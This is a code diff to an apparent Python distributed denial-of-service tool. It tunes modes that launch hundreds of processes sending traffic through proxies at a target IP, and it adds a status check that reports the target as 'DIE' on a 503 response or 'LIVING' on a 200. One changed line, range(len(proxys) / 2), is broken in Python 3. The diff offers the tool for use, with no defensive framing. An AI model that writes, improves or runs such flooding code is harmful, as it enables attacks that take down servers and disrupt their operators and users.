@@ -93,7 +93,7 @@ def mode_two(ip : type('')):
 def mode_three(ip : type('')):
 	Count, i = 0, 0
 	while Count <= 400:
-		printns(f'{round(100 * Count / 300, 2)}% start, please wait')
+		printns(f'{round(100 * Count / 400, 2)}% start, please wait')
 		temp = []
 		for j in range(1, 20):
 			temp.append(proxys[i + j])
@@ -105,7 +105,7 @@ def mode_three(ip : type('')):
 
 def mode_four(ip : type('')):
 	printns('Starting... : info')
-	for proxy in proxys:
+	for proxy in range(len(proxys) / 2 ):
 		Process(target=dos, args=(proxy, ip)).start()
 	sleep(0.1)
 	printns('All proxies started, starting while True: sleep(0.1)')
@@ -151,12 +151,12 @@ def ddos():
 	else:
 		recmod = 4
 	print('Choose your mode:')
-	print('Mode       Process count      Proxy per procces           Recomended platform')
-	print('1          100                20                          NETBOOK, RaspberryPI')
-	print('2          200                20                          PC, Server')
-	print('3          400                20                          PC, Server')
-	print('4          max*               1                           PC(very stronger), Central server')
-	print('---- *max - using maximum count proxies per process, example: 7000 proxies = 7000 process')
+	print('Mode       Process count      Proxy per procces           Recomended count core')
+	print('1          100                20                          2+')
+	print('2          200                20                          4+')
+	print('3          400                20                          8+')
+	print('4          1/2                1                           more')
+	print('---- *1/2 - using maximum count proxies per process, example: 7000 proxies = 3500 process')
 	print(f'--- Recomended mode for your PC: {recmod}; CPU count: {cpu}')
 	mod = ''
 	while mod == '':
@@ -171,7 +171,10 @@ def ddos():
 		while True: 
 			printns(f'Pinging to {ip}...')
 			e = requests.get(ip, headers=requests.utils.default_headers())
-			printns(f'SERVER STATUS: {e.status_code}, STATUS UPDATE: 5 secs + server ping')
+			if e.status_code == 503:
+				printns(f'SERVER STATUS: {e.status_code}(DIE), STATUS UPDATE: 5 secs + server ping')
+			elif e.status_code == 200:
+				printns(f'SERVER STATUS: {e.status_code}(LIVING), STATUS UPDATE: 5 secs + server ping')
 			sleep(5)
 	except KeyboardInterrupt:
 		print('Closing all process and clearing RAM, wait 5 sec')
